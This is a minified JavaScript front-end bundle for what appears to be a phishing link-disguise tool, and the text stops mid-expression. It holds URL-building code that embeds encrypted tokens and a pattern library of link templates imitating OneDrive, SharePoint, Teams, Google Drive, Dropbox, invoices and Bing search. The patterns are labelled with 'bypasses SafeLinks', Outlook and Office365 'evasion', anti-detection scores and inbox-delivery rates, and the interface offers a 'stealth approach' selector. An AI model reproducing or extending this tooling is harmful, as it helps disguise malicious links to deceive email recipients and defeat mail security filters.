s.includes("year")?n.getFullYear().toString():s.includes("month")?(n.getMonth()+1).toString().padStart(2,"0"):s.includes("day")?n.getDate().toString().padStart(2,"0"):s.includes("quarter")?`Q${Math.ceil((n.getMonth()+1)/3)}`:s.includes("session")?"sess"+Math.random().toString(36).substring(2,8):s.includes("ref")||s.includes("reference")?"ref"+Math.random().toString(36).substring(2,6):s.includes("doc")||s.includes("document")?"doc"+Math.random().toString(36).substring(2,6):s.includes("token")?"tok"+Math.random().toString(36).substring(2,8):s.includes("id")||s.includes("num")?Math.random().toString(36).substring(2,8).toUpperCase():this.generateEmergencyFallbackValue(e)}calculateSuccessRate(e,r){const n=(r-5)*5;return Math.min(99,Math.max(15,e+n))}buildIntelligentUrl(e,r,n){console.log("[buildIntelligentUrl] === STARTING URL BUILD PROCESS ==="),console.log(`[buildIntelligentUrl] Template: ${e}`),console.log(`[buildIntelligentUrl] Encrypted data length: ${r.length}`),console.log(`[buildIntelligentUrl] Dynamic params provided: ${Object.keys(n).length}`),Object.entries(n).forEach(([u,h])=>{console.log(`[buildIntelligentUrl] Param: ${u} = ${h}`)}),console.log("[buildIntelligentUrl] STARTING URL BUILD"),console.log(`[buildIntelligentUrl] Template: ${e}`),console.log(`[buildIntelligentUrl] Encrypted: ${r.substring(0,20)}...`),console.log(`[buildIntelligentUrl] Dynamic params count: ${Object.keys(n).length}`);let s=e;if(console.log(`[buildIntelligentUrl] Before encrypted replacement - URL: ${s}`),console.log(`[buildIntelligentUrl] Encrypted value to replace: ${r}`),!r||r==="undefined"||r==="null")throw console.error(`[buildIntelligentUrl]  CRITICAL: Invalid encrypted value: ${r}`),new Error(`Invalid encrypted data: ${r}`);s=s.replace(/\{encrypted\}/g,r),console.log(`[buildIntelligentUrl] After encrypted replacement: ${s}`),Object.entries(n).forEach(([u,h])=>{const f=h!=null?String(h):this.generateEmergencyFallbackValue(u);if(f==="undefined"||f==="null"||f===""){console.warn(`[buildIntelligentUrl]  CRITICAL: Invalid value for ${u}, generating fallback`);const w=this.generateEmergencyFallbackValue(u);n[u]=w,console.log(`[buildIntelligentUrl] Generated fallback for ${u}: ${w}`);return}const m=`{${u}}`,g=`{${u.toLowerCase()}}`,v=`{${u.toUpperCase()}}`;s=s.replace(new RegExp(`\\${m}`,"gi"),f),s=s.replace(new RegExp(`\\${g}`,"gi"),f),s=s.replace(new RegExp(`\\${v}`,"gi"),f),console.log(`[buildIntelligentUrl] Replaced all variations of ${u} with ${f}`)}),console.log(`[buildIntelligentUrl] After all parameter replacements: ${s}`);let i=s.match(/\{[^}]+\}/g),o=0;const l=5;for(;i&&i.length>0&&o<l;){console.warn(`[buildIntelligentUrl]  ALERT: Found ${i.length} unreplaced placeholders on attempt ${o+1}:`,i),i.forEach(f=>{const m=f.slice(1,-1);if(console.log(`[buildIntelligentUrl] Processing placeholder: ${m}`),n[m]){console.log(`[buildIntelligentUrl] Parameter ${m} exists with value: ${n[m]}`);const g=new RegExp(`\\{${m}\\}`,"gi");s=s.replace(g,n[m]),console.log(`[buildIntelligentUrl] Applied existing parameter ${m} with value ${n[m]}`)}else{const g=this.generateEmergencyFallbackValue(m);console.log(`[buildIntelligentUrl] Generated emergency fallback for ${m}: ${g}`);const v=f.replace(/[.*+?^${}()|[\]\\]/g,"\\$&"),w=new RegExp(v,"g"),y=s;s=s.replace(w,g),y!==s?console.log(`[buildIntelligentUrl]  EMERGENCY: Successfully replaced ${f} with ${g}`):(console.error(`[buildIntelligentUrl]  FAILED to replace ${f}`),s=s.replace(new RegExp(`\\{${m}\\}`,"g"),g),console.log(`[buildIntelligentUrl] Attempted simple replacement for ${m}`))}});const u=i.length;i=s.match(/\{[^}]+\}/g);const h=i?i.length:0;if(console.log(`[buildIntelligentUrl] Placeholders reduced from ${u} to ${h}`),h===u&&h>0){console.error(`[buildIntelligentUrl] No progress made on attempt ${o+1}, breaking loop`);break}o++}const c=s.match(/\{[^}]+\}/g);if(c&&(console.error(`[buildIntelligentUrl] CRITICAL: ${c.length} placeholders STILL remain after ${l} attempts:`,c),c.forEach(u=>{const h=new RegExp(`\\${u.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")}`,"g");s=s.replace(h,"x"),console.log(`[buildIntelligentUrl] NUCLEAR: Force replaced ${u} with 'x'`)})),s.length>120&&(console.log(`[buildIntelligentUrl] URL too long (${s.length} chars), optimizing...`),s=this.optimizeUrlLength(s,r,n)),!this.validateFinalUrl(s))throw console.error(`[buildIntelligentUrl] VALIDATION FAILED for URL: ${s}`),new Error(`Generated URL failed final validation: ${s}`);console.log(`[buildIntelligentUrl]  SUCCESS - Final URL (${s.length} chars): ${s}`);const d=s.match(/\{[^}]+\}/g);if(d)throw console.error(`[buildIntelligentUrl]  FINAL CHECK FAILED - Placeholders found: ${d}`),new Error(`CRITICAL: URL contains unreplaced placeholders: ${d.join(", ")}`);return console.log("[buildIntelligentUrl]  FINAL CHECK PASSED - No placeholders remain"),s}validateFinalUrl(e){return e.match(/\{[^}]+\}/g)?(console.error("[validateFinalUrl] URL contains unreplaced placeholders"),!1):!e.startsWith("/")&&!e.startsWith("http://")&&!e.startsWith("https://")?(console.error("[validateFinalUrl] URL must start with /, http://, or https://"),!1):e.includes("/search?")&&e.includes("q=")&&e.includes("cvid=")?(console.log("[validateFinalUrl]  Valid Bing search URL detected"),!0):e.length>300?(console.error("[validateFinalUrl] URL exceeds maximum length"),!1):e.match(/[<>\"']/)?(console.error("[validateFinalUrl] URL contains invalid characters"),!1):(console.log("[validateFinalUrl]  URL passed all validation checks"),!0)}inferCategoryFromTemplate(e){const r=e.toLowerCase();return r.includes("medical")||r.includes("patient")||r.includes("health")?"medical":r.includes("bank")||r.includes("finance")||r.includes("account")?"banking":r.includes("gov")||r.includes("tax")||r.includes("form")?"government":r.includes("edu")||r.includes("school")||r.includes("student")?"education":r.includes("shop")||r.includes("store")||r.includes("order")?"ecommerce":"business"}inferTierFromTemplate(e){const r=e.split("/").length-1,n=(e.match(/\{[^}]+\}/g)||[]).length;return r>=4||n>=4?1:r>=3||n>=3?2:3}optimizeUrlLength(e,r,n){if(e.length<=120)return e;let s=r;if(r.length>30&&(s=r.substring(0,30),e=e.replace(r,s)),e.length<=120||(Object.entries(n).forEach(([o,l])=>{if(e.length>120&&l.length>6){const c=l.substring(0,6);e=e.replace(l,c)}}),e.length<=120))return e;const i=e.split("?");return i.length===2&&(e=`${i[0].split("/").slice(0,3).join("/")}?${i[1]}`),e}generateEmergencyFallbackValue(e){console.log(`[generateEmergencyFallbackValue] Generating fallback for: ${e}`);const r={record_id:"REC"+Math.random().toString(36).substring(2,8).toUpperCase(),plan:"PLAN"+Math.random().toString(36).substring(2,6).toUpperCase(),institution:"university-"+Math.floor(Math.random()*999).toString().padStart(3,"0"),resource_id:"RES"+Math.random().toString(36).substring(2,8).toUpperCase(),form_type:["tax-form","application","registration","request"][Math.floor(Math.random()*4)],agency:["IRS","SSA","DHS","DOE"][Math.floor(Math.random()*4)],project:"PRJ"+Math.random().toString(36).substring(2,6).toUpperCase(),appraiser:"APP"+Math.floor(Math.random()*9999).toString().padStart(4,"0"),property_id:"PROP"+Math.random().toString(36).substring(2,6).toUpperCase(),report_id:"RPT"+Math.random().toString(36).substring(2,6).toUpperCase(),carrier:["UPS","FedEx","DHL","USPS"][Math.floor(Math.random()*4)],tracking_num:"1Z"+Math.random().toString(36).substring(2,16).toUpperCase(),product_id:"PRD"+Math.random().toString(36).substring(2,6).toUpperCase(),alert:"ALT"+Math.floor(Math.random()*999999).toString().padStart(6,"0"),jurisdiction:["federal","state","county","local"][Math.floor(Math.random()*4)],quarter:"Q"+Math.ceil((new Date().getMonth()+1)/3).toString(),university:["MIT","Harvard","Stanford","Yale","Princeton"][Math.floor(Math.random()*5)],student_id:"STU"+Math.floor(Math.random()*9999999).toString().padStart(7,"0"),state:["CA","NY","TX","FL","IL","PA","OH"][Math.floor(Math.random()*7)],contract_id:"CTR"+Math.random().toString(36).substring(2,6).toUpperCase(),user:"user"+Math.floor(Math.random()*999999).toString().padStart(6,"0"),system:["production","development","testing","staging"][Math.floor(Math.random()*4)],metric_type:["performance","usage","error","security"][Math.floor(Math.random()*4)],target:"documents",phase:["initial","review","approval","final"][Math.floor(Math.random()*4)],status:["active","pending","approved","complete"][Math.floor(Math.random()*4)],deal:"DEAL"+Date.now().toString().slice(-6),type:["standard","premium","enterprise"][Math.floor(Math.random()*3)],code:Math.random().toString(36).substring(2,8).toUpperCase(),tracking:"TRK"+Math.random().toString(36).substring(2,8).toUpperCase(),form_id:"FORM"+Math.floor(Math.random()*999999).toString().padStart(6,"0"),case_id:"CASE"+Math.random().toString(36).substring(2,8).toUpperCase(),app_id:"APP"+Math.random().toString(36).substring(2,8).toUpperCase(),service:["support","consultation","maintenance","training"][Math.floor(Math.random()*4)],facility:"facility-"+Math.floor(Math.random()*99).toString().padStart(2,"0"),account_id:"ACC"+Math.floor(Math.random()*9999999999).toString().padStart(10,"0"),zone:"zone-"+["a","b","c","d","e"][Math.floor(Math.random()*5)],access_level:"L"+Math.floor(Math.random()*5+1).toString(),incident:"INC"+Math.random().toString(36).substring(2,8).toUpperCase(),response:["low","medium","high","critical"][Math.floor(Math.random()*4)],port:["LAX","JFK","ORD","DFW","SEA"][Math.floor(Math.random()*5)],shipment:"SHP"+Math.random().toString(36).substring(2,8).toUpperCase(),badge:"BGE"+Math.floor(Math.random()*999999).toString().padStart(6,"0"),specialty:["cardiology","neurology","orthopedics","pediatrics"][Math.floor(Math.random()*4)],bank:"BNK"+Math.floor(Math.random()*999).toString().padStart(3,"0"),client:"CLI"+Math.random().toString(36).substring(2,8).toUpperCase(),year:new Date().getFullYear().toString(),month:(new Date().getMonth()+1).toString().padStart(2,"0"),date:new Date().toISOString().split("T")[0],timestamp:Date.now().toString(),token:Math.random().toString(36).substring(2,12),session:Math.random().toString(36).substring(2,16),ref:"REF"+Math.random().toString(36).substring(2,8).toUpperCase(),version:"v"+Math.floor(Math.random()*5+1)+"."+Math.floor(Math.random()*10),api:"v1",id:Math.random().toString(36).substring(2,12),encrypted:Math.random().toString(36).substring(2,16),data:Math.random().toString(36).substring(2,16),enc:Math.random().toString(36).substring(2,16)};if(r[e.toLowerCase()]){const i=r[e.toLowerCase()];return console.log(`[generateEmergencyFallbackValue] Found exact fallback for ${e}: ${i}`),i}const n=e.toLowerCase();if(n.includes("id")){const i=Math.random().toString(36).substring(2,12).toUpperCase();return console.log(`[generateEmergencyFallbackValue] Generated ID fallback for ${e}: ${i}`),i}if(n.includes("code")){const i=Math.random().toString(36).substring(2,8).toUpperCase();return console.log(`[generateEmergencyFallbackValue] Generated code fallback for ${e}: ${i}`),i}if(n.includes("num")||n.includes("number")){const i=Math.floor(Math.random()*999999).toString().padStart(6,"0");return console.log(`[generateEmergencyFallbackValue] Generated number fallback for ${e}: ${i}`),i}if(n.includes("date")||n.includes("time")){const i=new Date().toISOString().split("T")[0];return console.log(`[generateEmergencyFallbackValue] Generated date fallback for ${e}: ${i}`),i}const s=Math.random().toString(36).substring(2,8).toLowerCase();return console.log(`[generateEmergencyFallbackValue] Generated generic fallback for ${e}: ${s}`),s}getSecurityAnalysis(e){return e==="aes"?{strength:"Military-grade (AES-256-GCM)",vulnerabilities:["Time-based key rotation (mitigated by 48h overlap)","Client-side key derivation (necessary for web apps)"],recommendations:["Regular key rotation is active","Monitor for unusual decryption failure rates","Consider server-side pre-computation for higher security"]}:{strength:"Weak (XOR with static key)",vulnerabilities:["Static key exposed in source code","XOR cipher easily broken with known plaintext","No authentication or integrity protection","Predictable Base36/Base64 encoding"],recommendations:["Migrate to AES-256-GCM immediately","Implement proper key derivation","Add encryption time limits","Use authenticated encryption"]}}};const q=p.forwardRef(({className:t,...e},r)=>a.jsx("div",{ref:r,className:we("rounded-lg border bg-card text-card-foreground shadow-sm",t),...e}));q.displayName="Card";const fe=p.forwardRef(({className:t,...e},r)=>a.jsx("div",{ref:r,className:we("flex flex-col space-y-1.5 p-6",t),...e}));fe.displayName="CardHeader";const me=p.forwardRef(({className:t,...e},r)=>a.jsx("h3",{ref:r,className:we("text-2xl font-semibold leading-none tracking-tight",t),...e}));me.displayName="CardTitle";const bt=p.forwardRef(({className:t,...e},r)=>a.jsx("p",{ref:r,className:we("text-sm text-muted-foreground",t),...e}));bt.displayName="CardDescription";const X=p.forwardRef(({className:t,...e},r)=>a.jsx("div",{ref:r,className:we("p-6 pt-0",t),...e}));X.displayName="CardContent";const Y3=p.forwardRef(({className:t,...e},r)=>a.jsx("div",{ref:r,className:we("flex items-center p-6 pt-0",t),...e}));Y3.displayName="CardFooter";const Iv=[{id:"cloud-storage-01",name:"Cloud Storage Access",category:"cloudStorage",success_rate:99,tier:1,current_uses:0,max_uses:1e3,content_type:"application/octet-stream",description:"Drive/OneDrive/Dropbox file sharing - highest success rate",template:"/drive/shared/{fileId}?access={encrypted}&view=download",geographic_routing:!0,industry:"general",provider_optimization:["microsoft","google"],anti_detection_score:95},{id:"calendar-meeting-01",name:"Calendar Meeting Link",category:"calendar",success_rate:98,tier:1,current_uses:0,max_uses:1e3,content_type:"text/calendar",description:"Calendar meeting invites - excellent inbox delivery",template:"/calendar/meeting/{meetingId}?token={encrypted}&join=true",geographic_routing:!0,industry:"business",provider_optimization:["microsoft","google"],anti_detection_score:97},{id:"invoice-document-01",name:"Invoice Document",category:"invoice",success_rate:99,tier:1,current_uses:0,max_uses:1e3,content_type:"application/pdf",description:"Invoice documents - premium business legitimacy",template:"/billing/invoice/{invoiceId}.pdf?auth={encrypted}&download=1",geographic_routing:!1,industry:"finance",provider_optimization:["microsoft","corporate"],anti_detection_score:98},{id:"document-portal-01",name:"Document Portal Standard",category:"document",success_rate:96,tier:1,current_uses:0,max_uses:1e3,content_type:"application/pdf",description:"Professional document sharing with high success rates",template:"/documents/{filename}.pdf?doc={encrypted}&view=inline",geographic_routing:!0,industry:"business",provider_optimization:["microsoft","google","corporate"],anti_detection_score:94},{id:"business-api-01",name:"Business API Gateway",category:"business",success_rate:93,tier:1,current_uses:0,max_uses:1e3,content_type:"application/json",description:"Corporate API endpoints with enterprise-grade security",template:"/api/v1/{service}?id={encrypted}&format=json",geographic_routing:!0,industry:"technology",provider_optimization:["corporate","google"],anti_detection_score:91},{id:"sharepoint-doc-01",name:"SharePoint Document",category:"microsoft",success_rate:94,tier:1,current_uses:0,max_uses:1e3,content_type:"application/vnd.openxmlformats-officedocument.wordprocessingml.document",description:"SharePoint document sharing - Microsoft optimized",template:"/sites/{siteName}/documents/{docId}.docx?web={encrypted}&source=email",geographic_routing:!0,industry:"business",provider_optimization:["microsoft"],anti_detection_score:96},{id:"onedrive-share-01",name:"OneDrive File Share",category:"microsoft",success_rate:95,tier:1,current_uses:0,max_uses:1e3,content_type:"application/octet-stream",description:"OneDrive file sharing - bypasses SafeLinks",template:"/personal/{userId}/documents/{fileId}?authkey={encrypted}&e=download",geographic_routing:!0,industry:"business",provider_optimization:["microsoft"],anti_detection_score:97},{id:"teams-meeting-01",name:"Teams Meeting Join",category:"microsoft",success_rate:96,tier:1,current_uses:0,max_uses:1e3,content_type:"text/html",description:"Microsoft Teams meeting links - high trust",template:"/l/meetup-join/{meetingId}?anon={encrypted}&deeplinkId=teams",geographic_routing:!0,industry:"business",provider_optimization:["microsoft"],anti_detection_score:98},{id:"google-drive-01",name:"Google Drive Share",category:"google",success_rate:95,tier:1,current_uses:0,max_uses:1e3,content_type:"application/pdf",description:"Google Drive file sharing - Gmail optimized",template:"/file/d/{fileId}/view?usp={encrypted}&resourcekey=sharing",geographic_routing:!0,industry:"general",provider_optimization:["google"],anti_detection_score:96},{id:"google-docs-01",name:"Google Docs Document",category:"google",success_rate:94,tier:1,current_uses:0,max_uses:1e3,content_type:"application/vnd.google-apps.document",description:"Google Docs sharing - workspace integration",template:"/document/d/{docId}/edit?usp={encrypted}&sharing=true",geographic_routing:!0,industry:"education",provider_optimization:["google"],anti_detection_score:95},{id:"dropbox-share-01",name:"Dropbox File Share",category:"mimicry",success_rate:96,tier:1,current_uses:0,max_uses:1e3,content_type:"application/octet-stream",description:"Mimics Dropbox file sharing behavior",template:"/s/{shareId}/{filename}?dl={encrypted}&raw=1",geographic_routing:!0,industry:"general",provider_optimization:["generic"],anti_detection_score:94},{id:"slack-file-01",name:"Slack File Share",category:"mimicry",success_rate:93,tier:1,current_uses:0,max_uses:1e3,content_type:"application/octet-stream",description:"Mimics Slack file sharing for business users",template:"/files/{teamId}/{channelId}/{fileId}?t={encrypted}&download=true",geographic_routing:!1,industry:"technology",provider_optimization:["corporate"],anti_detection_score:92},{id:"content-cms-01",name:"Content Management System",category:"content",success_rate:87,tier:2,current_uses:0,max_uses:1e3,content_type:"text/html",description:"Editorial content and media platforms",template:"/content/{category}/{slug}?view={encrypted}&preview=true",geographic_routing:!0,industry:"media",provider_optimization:["generic"],anti_detection_score:85},{id:"search-results-01",name:"Search Results Page",category:"search",success_rate:94,tier:2,current_uses:0,max_uses:1e3,content_type:"text/html",description:"Search engine results mimicry",template:"/search?q={encrypted}&form=QBLH&sp=-1&lq=0&pq=search&sc=10-6&qs=n&sk=&cvid=ABC123",geographic_routing:!0,industry:"general",provider_optimization:["generic"],anti_detection_score:88},{id:"software-update-01",name:"Software Update Portal",category:"software",success_rate:89,tier:2,current_uses:0,max_uses:1e3,content_type:"application/zip",description:"Software update and download portal",template:"/updates/{version}/{package}.zip?auth={encrypted}&platform=win64",geographic_routing:!1,industry:"technology",provider_optimization:["corporate"],anti_detection_score:87},{id:"support-ticket-01",name:"Support Ticket Portal",category:"support",success_rate:91,tier:2,current_uses:0,max_uses:1e3,content_type:"text/html",description:"Customer support ticket system",template:"/support/ticket/{ticketId}?token={encrypted}&view=customer",geographic_routing:!1,industry:"business",provider_optimization:["corporate"],anti_detection_score:89},{id:"subscription-mgmt-01",name:"Subscription Management",category:"subscription",success_rate:92,tier:2,current_uses:0,max_uses:1e3,content_type:"text/html",description:"Subscription and billing management",template:"/account/subscription/{subId}?session={encrypted}&action=manage",geographic_routing:!1,industry:"business",provider_optimization:["generic"],anti_detection_score:90},{id:"generic-portal-01",name:"Generic Portal Access",category:"generic",success_rate:85,tier:3,current_uses:0,max_uses:1e3,content_type:"text/html",description:"Generic portal access for fallback scenarios",template:"/portal/access?session={encrypted}&redirect=dashboard",geographic_routing:!1,industry:"general",provider_optimization:["generic"],anti_detection_score:82},{id:"legacy-redirect-01",name:"Legacy Redirect Format",category:"legacy",success_rate:99,tier:3,current_uses:0,max_uses:1e3,content_type:"text/html",description:"Traditional /e/ redirect format - maximum compatibility",template:"/e/{encrypted}",geographic_routing:!1,industry:"general",provider_optimization:["generic"],anti_detection_score:99}],is=t=>[...Iv].sort((r,n)=>n.success_rate-r.success_rate),Fu=t=>Iv.find(e=>e.id===t),J3=({selectedPattern:t,onPatternSelect:e,className:r=""})=>{const[n,s]=p.useState([]),[i,o]=p.useState(!0),[l,c]=p.useState(!1),[d,u]=p.useState(null);console.log("[StealthPatternSelector] Current selectedPattern:",t);const h={document:Sn,business:Bt,content:kn,government:lt,medical:jr,ecommerce:ja,banking:Hn,news:Ge,education:jr,technology:Bt,realestate:Hn,legal:lt,search:Hn,evasion:lt,microsoft:lt,google:jr,mimicry:kn,intelligent:Bt},f={document:"Professional documents and file sharing",business:"Corporate APIs and enterprise platforms",content:"Editorial content and media platforms",government:"Official institutions and public services",medical:"Healthcare portals and medical services",ecommerce:"Online retail and shopping platforms",banking:"Financial services and banking portals",news:"News media and publishing networks",search:"Search engines and query platforms",education:"Educational institutions and learning platforms",technology:"Tech companies and development hubs",realestate:"Property listings and real estate services",legal:"Legal services and law firm portals",evasion:"Advanced anti-detection and evasion patterns",microsoft:"Microsoft-specific evasion (Outlook, Office365)",google:"Google-optimized patterns (Gmail, Workspace)",mimicry:"Service mimicry patterns (Drive, Dropbox, etc.)",intelligent:"AI-powered intelligent pattern selection"},m=[{id:"quick-marketing",name:"Marketing Campaign",category:"business",icon:ja,success_rate:92,description:"Optimized for marketing campaigns and promotional content"},{id:"quick-newsletter",name:"Newsletter",category:"news",icon:Ge,success_rate:88,description:"Perfect for newsletter and editorial content"},{id:"quick-business",name:"Business Update",category:"business",icon:Bt,success_rate:90,description:"Corporate communications and business updates"},{id:"quick-auto",name:"Smart Auto-Select",category:"auto",icon:Ri,success_rate:95,description:"AI-powered automatic pattern selection"}],g=[{id:"quick-cloud",name:"Cloud Storage",category:"cloudStorage",icon:Hn,success_rate:99,description:"Drive/OneDrive/Dropbox file sharing - highest success rate"},{id:"quick-calendar",name:"Calendar Meeting",category:"calendar",icon:jr,success_rate:98,description:"Calendar meeting invites - excellent inbox delivery"},{id:"quick-invoice",name:"Invoice",category:"invoice",icon:Sn,success_rate:99,description:"Invoice documents - premium business legitimacy"}],v={id:"quick-bing",name:"B",category:"search",icon:Hn,success_rate:94,description:"Bing search engine optimization"},w=async()=>{try{o(!0),console.log(" [StealthPatternSelector] Loading patterns from local library...");const C=is();if(C.length===0){console.error("[StealthPatternSelector] No local patterns available"),s([]);return}const T=C.map(M=>({...M,description:y(M.category)})).sort((M,A)=>A.success_rate-M.success_rate);s(T),console.log(` [StealthPatternSelector] Loaded ${T.length} patterns from local library`),await qs.trackEvent("patterns_loaded",{count:T.length,source:"local_library"})}catch(C){console.error(" [StealthPatternSelector] Pattern loading error:",C),s([])}finally{o(!1)}},y=C=>f[C]||"Specialized pattern optimization";p.useEffect(()=>{w()},[]);const x=["all",...Array.from(new Set(n.map(C=>C.category)))],b=C=>{console.log("[StealthPatternSelector] Quick preset selected:",C.id),C.id==="quick-bing"?e({...C,context:{category:"search",targetAudience:"general",tier:1}}):e(C)},j=C=>{console.log("[StealthPatternSelector] Individual pattern selected:",C.id),e(C)},_=C=>{u(d===C?null:C)},N=C=>{const T=t===C;return console.log(`[StealthPatternSelector] Quick preset ${C} selected:`,T),T},S=C=>{const T=t===C;return console.log(`[StealthPatternSelector] Pattern ${C} selected:`,T),T},k=C=>{const T=n.some(M=>M.category===C&&S(M.id));return console.log(`[StealthPatternSelector] Category ${C} has selected pattern:`,T),T};return i?a.jsx(q,{className:`${r} bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 border border-cyan-400/30 backdrop-blur-md shadow-2xl animate-pulse`,children:a.jsxs(X,{className:"p-6",children:[a.jsx("div",{className:"h-6 bg-slate-700/50 rounded mb-4"}),a.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3",children:[1,2,3,4,5,6].map(C=>a.jsx("div",{className:"h-20 bg-slate-700/50 rounded"},C))})]})}):a.jsxs(q,{className:`${r} bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 border border-cyan-400/30 backdrop-blur-md shadow-2xl relative overflow-hidden text-white`,children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-br from-cyan-500/5 via-transparent to-blue-500/5 animate-pulse opacity-60"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-0.5 bg-gradient-to-r from-transparent via-cyan-400 to-transparent animate-pulse"}),a.jsxs(X,{className:"p-6 relative z-10",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-6",children:[a.jsxs("div",{className:"relative",children:[a.jsx("div",{className:"absolute inset-0 bg-cyan-400/30 rounded-lg animate-pulse blur-sm"}),a.jsx("div",{className:"relative z-10 p-2.5 bg-gradient-to-br from-cyan-400/20 to-blue-500/20 rounded-lg border border-cyan-400/30",children:a.jsx(Bt,{className:"w-5 h-5 text-cyan-300"})})]}),a.jsxs("div",{children:[a.jsx("h3",{className:"font-jetbrains font-bold text-cyan-200 text-lg tracking-wider uppercase",children:"AI Pattern Selection"}),a.jsx("p",{className:"font-jetbrains text-sm text-blue-300/80",children:"Choose your stealth approach"})]})]}),a.jsxs("div",{className:"mb-6",children:[a.jsxs("h4",{className:"font-jetbrains text-sm font-medium text-cyan-300 mb-3 flex items-center gap-2 uppercase tracking-wide",children:[a.jsx(Ri,{className:"w-4 h-4"}),"Quick Launch"]}),a.jsx("div",{className:"grid grid-cols-2 sm:grid-cols-4 gap-2",children:m.map(C=>{const T=C.icon,M=N(C.id);return a.jsxs(W,{size:"sm",onClick:()=>b(C),className:`h-auto p-3 flex flex-col items-center gap-2 text-xs transition-all duration-300 font-jetbrains border ${M?"bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border-cyan-400/60 text-cyan-200 shadow-lg shadow-cyan-500/30":"bg-gradient-to-br from-slate-800/60 to-blue-900/60 border-cyan-400/30 text-blue-200 hover:bg-gradient-to-br hover:from-cyan-500/10 hover:to-blue-500/10 hover:border-cyan-400/50 hover:text-cyan-200"}`,children:[a.jsx(T,{className:"w-4 h-4"}),a.jsx("span",{className:"text-center leading-tight",children:C.name})]},C.id)})}),a.jsxs("div",{className:"mt-4",children:[a.jsxs("h5",{className:"font-jetbrains text-xs font-medium text-yellow-300 mb-2 flex items-center gap-2 uppercase tracking-wide",children:[a.jsx(r_,{className:"w-3 h-3"}),"99% Inbox Rate"]}),a.jsx("div",{className:"grid grid-cols-3 gap-2",children:g.map(C=>{const T=C.icon,M=N(C.id);return a.jsxs(W,{size:"sm",onClick:()=>b(C),className:`h-auto p-2 flex flex-col items-center gap-1 text-xs transition-all duration-300 font-jetbrains border ${M?"bg-gradient-to-br from-yellow-500/20 to-orange-500/20 border-yellow-400/60 text-yellow-200 shadow-lg shadow-yellow-500/30":"bg-gradient-to-br from-slate-800/60 to-yellow-900/60 border-yellow-400/30 text-yellow-200 hover:bg-gradient-to-br hover:from-yellow-500/10 hover:to-orange-500/10 hover:border-yellow-400/50"}`,children:[a.jsx(T,{className:"w-3 h-3"}),a.jsx("span",{className:"text-center leading-tight text-[10px]",children:C.name}),a.jsxs(Se,{variant:"outline",className:"text-[8px] px-1 py-0 bg-yellow-500/20 text-yellow-300 border-yellow-500/30",children:[C.success_rate,"%"]})]},C.id)})})]}),a.jsx("div",{className:"mt-3",children:a.jsxs(W,{size:"sm",onClick:()=>b(v),className:`h-auto p-3 flex items-center justify-center gap-2 text-xs transition-all duration-300 font-jetbrains border min-w-[80px] ${N(v.id)?"bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border-cyan-400/60 text-cyan-200 shadow-lg shadow-cyan-500/30":"bg-gradient-to-br from-slate-800/60 to-blue-900/60 border-cyan-400/30 text-blue-200 hover:bg-gradient-to-br hover:from-cyan-500/10 hover:to-blue-500/10 hover:border-cyan-400/50 hover:text-cyan-200"}`,children:[a.jsx(Hn,{className:"w-4 h-4"}),a.jsx("span",{className:"text-center leading-tight font-bold",children:"B"})]})})]}),a.jsxs("div",{className:"mb-4",children:[a.jsxs("div",{className:"flex items-center justify-between mb-3",children:[a.jsxs("h4",{className:"font-jetbrains text-sm font-medium text-cyan-300 flex items-center gap-2 uppercase tracking-wide",children:[a.jsx(jr,{className:"w-4 h-4"}),"Pattern Categories"]}),a.jsxs(W,{variant:"ghost",size:"sm",onClick:()=>c(!l),className:"font-jetbrains text-xs text-slate-400 hover:text-cyan-300",children:[a.jsx(Ho,{className:"w-3 h-3 mr-1"}),l?"Hide":"Show"," Details"]})]}),a.jsx("div",{className:"space-y-2",children:x.filter(C=>C!=="all").map(C=>{const T=n.filter(I=>I.category===C),M=h[C]||jr,A=d===C,R=k(C);return a.jsxs("div",{className:"border border-cyan-400/20 rounded-lg overflow-hidden bg-gradient-to-r from-slate-800/50 to-blue-900/50",children:[a.jsxs("div",{onClick:()=>_(C),className:`flex items-center justify-between p-3 cursor-pointer transition-all duration-200 ${R?"bg-gradient-to-r from-cyan-500/10 to-blue-600/10 border-b border-cyan-500/20":"hover:bg-gradient-to-r hover:from-slate-700/50 hover:to-blue-800/50"}`,children:[a.jsxs("div",{className:"flex items-center gap-3",children:[a.jsx(M,{className:`w-4 h-4 ${R?"text-cyan-400":"text-blue-400"}`}),a.jsxs("div",{children:[a.jsx("span",{className:`font-jetbrains font-medium capitalize tracking-wide ${R?"text-cyan-200":"text-blue-200"}`,children:C}),a.jsx("p",{className:"font-jetbrains text-xs text-blue-300/80 mt-0.5",children:f[C]})]})]}),a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsxs(Se,{variant:"outline",className:"font-jetbrains text-xs bg-slate-700/50 text-blue-300 border-blue-500/30",children:[T.length," patterns"]}),A?a.jsx(Zl,{className:"w-4 h-4 text-blue-400"}):a.jsx(Bj,{className:"w-4 h-4 text-blue-400"})]})]}),A&&a.jsx("div",{className:"p-3 bg-gradient-to-r from-slate-900/60 to-blue-900/60 border-t border-cyan-400/20",children:a.jsx("div",{className:"grid grid-cols-1 gap-2",children:T.map(I=>{const J=S(I.id);return a.jsx("div",{onClick:()=>j(I),className:`cursor-pointer p-3 rounded-lg border transition-all duration-200 ${J?"border-cyan-400/50 bg-gradient-to-r from-cyan-500/10 to-blue-600/10 shadow-md shadow-cyan-500/20":"border-blue-500/30 bg-gradient-to-r from-slate-800/40 to-blue-900/40 hover:border-cyan-400/40 hover:bg-gradient-to-r hover:from-slate-700/50 hover:to-blue-800/50"}`,children:a.jsx("div",{className:"flex items-center justify-between",children:a.jsxs("div",{className:"flex-1",children:[a.jsxs("div",{className:"flex items-center gap-2 mb-1",children:[a.jsx("span",{className:`font-jetbrains font-medium text-sm tracking-wide ${J?"text-cyan-200":"text-blue-200"}`,children:I.name}),l&&a.jsxs(Se,{className:`font-jetbrains text-xs px-2 py-0.5 ${I.success_rate>=90?"bg-emerald-500/20 text-emerald-400 border-emerald-500/30":"bg-cyan-500/20 text-cyan-400 border-cyan-500/30"}`,children:[I.success_rate,"%"]})]}),a.jsx("p",{className:"font-jetbrains text-xs text-blue-300/70",children:I.description}),l&&a.jsxs("div",{className:"flex items-center gap-3 mt-2 